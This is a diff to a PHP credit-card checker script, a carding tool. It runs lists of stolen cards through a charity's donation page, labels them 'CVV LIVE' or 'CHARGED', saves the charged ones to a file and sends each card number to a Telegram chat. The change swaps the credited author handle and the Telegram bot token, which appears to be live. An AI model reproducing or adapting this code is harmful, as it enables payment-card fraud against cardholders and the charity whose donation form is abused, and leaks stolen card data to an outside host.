@@ -327,18 +327,18 @@ echo"$poxySocks4<br>";
 
 
  if (strpos($result3,  '"cvc_check": "pass"')) {
-    echo   "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span><span class='text-success'> MSG->[CVV LIVE]</span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
+    echo   "CVV<b><span class='text-danger'></span> <span class='text-primary'>$lista</b></span><span class='text-success'> MSG->[CVV LIVE]</span><span> <span class='text-danger'>[BY:- @ERR0R9]<b></span>  </br>";
   }
   
   elseif
   (strpos($result3,  'Thanks for supporting Gold Country Community Services!')) {
-    echo  "CHARGED<b><span class='text-danger'></span> <span class='text-success'>$lista</b></span><span class='text-primary'> MSG->[THANK YOU FOR DONATION]</span><span> <span class='text-danger'>[BY:- @badboychx]<b></span>  </br>";
+    echo  "CHARGED<b><span class='text-danger'></span> <span class='text-success'>$lista</b></span><span class='text-primary'> MSG->[THANK YOU FOR DONATION]</span><span> <span class='text-danger'>[BY:- @ERR0R9]<b></span>  </br>";
     file_put_contents('charged.txt', $lista  . PHP_EOL, FILE_APPEND);
 $time = $info['total_time'];
    $msg = 
     "#LIVE CC: ".$lista." 
     Result: CHARGED\r\n";
-    $apiToken = "5959454722:AAFnG4oZXQPKvdeIAsr5mjrsGaJR0CRZYJo";
+    $apiToken = "6391010764:AAF4WeuGMC0SXaxXv-use-TPwtxz0yqZX8U";
     $logger = ['chat_id' => $idd,'text' => $msg ];
     $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($logger) );
   }
